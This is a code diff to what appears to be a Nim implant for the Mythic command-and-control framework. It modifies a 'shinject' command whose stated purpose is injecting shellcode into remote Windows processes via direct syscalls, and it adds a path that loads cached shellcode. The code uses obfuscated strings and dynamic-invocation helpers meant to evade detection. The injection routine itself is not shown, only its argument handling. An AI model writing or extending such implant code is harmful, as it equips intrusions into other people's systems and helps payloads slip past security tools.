@@ -1,11 +1,11 @@
 import json
 import ../utils/strenc
+import ../global_data
 
 when defined(windows):
   import base64
   import winim/lean
   import ../utils/[delegates, dinvoke, crypto]
-  import strutils
   
   type
     ShinjectArgs = object
@@ -18,6 +18,11 @@ when defined(windows):
 
 const CHUNK_SIZE = 512000
 
+# Forward declaration
+proc processShinjectChunk*(taskId: string, params: JsonNode, chunkData: string, 
+                          totalChunks: int, currentChunk: int, 
+                          fileData: var seq[byte]): JsonNode
+
 proc shinject*(taskId: string, params: JsonNode): JsonNode =
   ## Inject shellcode into a remote process using direct syscalls
   when not defined(windows):
@@ -29,6 +34,25 @@ proc shinject*(taskId: string, params: JsonNode): JsonNode =
     }
   else:
     try:
+      # Check if using cached file first (no uuid needed)
+      if params.hasKey(obf("cached")):
+        let cachedName = params[obf("cached")].getStr()
+        let cachedData = getCachedFile(cachedName)
+        if cachedData.len == 0:
+          return %*{
+            obf("task_id"): taskId,
+            obf("completed"): true,
+            obf("status"): "error",
+            obf("user_output"): obf("File not found in cache. Use register_file first: ") & cachedName
+          }
+        # Build params with dummy uuid for downstream parsing
+        var cachedParams = copy(params)
+        if not cachedParams.hasKey(obf("uuid")):
+          cachedParams[obf("uuid")] = %""
+        var fileData = cachedData
+        return processShinjectChunk(taskId, cachedParams, "", 1, 1, fileData)
+      
+      # Non-cached: parse full args (uuid required)
       let args = to(params, ShinjectArgs)
       
       # Step 1: Request the shellcode file from Mythic
